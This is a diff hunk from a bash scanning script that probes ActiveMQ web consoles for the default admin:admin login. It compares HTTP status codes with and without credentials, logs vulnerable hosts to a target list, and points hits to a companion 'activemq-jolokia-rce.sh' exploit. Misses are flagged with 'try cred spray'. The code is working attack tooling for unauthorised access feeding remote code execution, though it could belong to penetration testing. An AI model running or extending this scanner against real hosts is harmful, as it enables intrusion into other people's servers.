@@ -37,13 +37,25 @@ probe_one() {
                 curl -sk -m 8 -u admin:admin "http://$ip:$port/api/jolokia/list" 2>&1 | head -c 4000
             } > "$d/http.txt" 2>&1
 
-            # Classify
-            if grep -q '"value":"' "$d/http.txt" && grep -q 'BrokerVersion' "$d/http.txt"; then
-                VER=$(grep -oE '"value":"[0-9.]+"' "$d/http.txt" | head -1 | tr -d '"' | cut -d: -f2)
-                hit "$ip:$port  admin:admin WORKS  v$VER  -> standalones/activemq/activemq-jolokia-rce.sh"
-                echo "$ip:$port|$VER|admin:admin" >> "$OUT/_jolokia_admin.txt"
-            elif curl -sk -m 3 -o /dev/null -w '%{http_code}' "http://$ip:$port/admin/" | grep -q '401'; then
-                miss "$ip:$port  web console up but default creds rejected — try cred spray"
+            # Classify by the AUTH GATE, not by Jolokia. Jetty Basic auth: a valid
+            # login clears the 401 (returns 2xx/3xx — the console often 302-redirects
+            # to a dashboard). The old logic keyed success off a Jolokia BrokerVersion
+            # read, but modern Jolokia (>=1.5) blocks cross-origin/curl reads (403)
+            # even with valid creds, so admin:admin was wrongly reported "rejected".
+            unauth_code=$(curl -sk -m 5 -o /dev/null -w '%{http_code}' "http://$ip:$port/admin/" 2>/dev/null || echo 000)
+            auth_code=$(curl -sk -m 5 -u admin:admin -o /dev/null -w '%{http_code}' "http://$ip:$port/admin/" 2>/dev/null || echo 000)
+            VER=$(grep -oE '"value" *: *"[0-9][0-9.]*"' "$d/http.txt" | head -1 | grep -oE '[0-9][0-9.]*' | head -1)
+            echo "auth-probe: unauth /admin/=$unauth_code ; admin:admin /admin/=$auth_code" >> "$d/http.txt"
+            if [[ "$unauth_code" =~ ^(401|403)$ && "$auth_code" =~ ^(2|3)[0-9][0-9]$ ]]; then
+                hit "$ip:$port  admin:admin WORKS (auth ${unauth_code}->${auth_code})${VER:+  v$VER}  -> standalones/activemq/activemq-jolokia-rce.sh"
+                echo "$ip:$port|${VER:-unknown}|admin:admin" >> "$OUT/_jolokia_admin.txt"
+            elif [[ "$auth_code" =~ ^(401|403)$ ]]; then
+                miss "$ip:$port  web console up but default creds rejected (admin:admin -> $auth_code) — try cred spray"
+            elif [[ "$unauth_code" =~ ^(2|3)[0-9][0-9]$ ]]; then
+                hit "$ip:$port  web console OPEN — no auth required (unauth $unauth_code)${VER:+  v$VER}"
+                echo "$ip:$port|${VER:-unknown}|NO-AUTH" >> "$OUT/_jolokia_admin.txt"
+            else
+                miss "$ip:$port  web console probe inconclusive (unauth=$unauth_code auth=$auth_code)"
             fi
             ;;
 
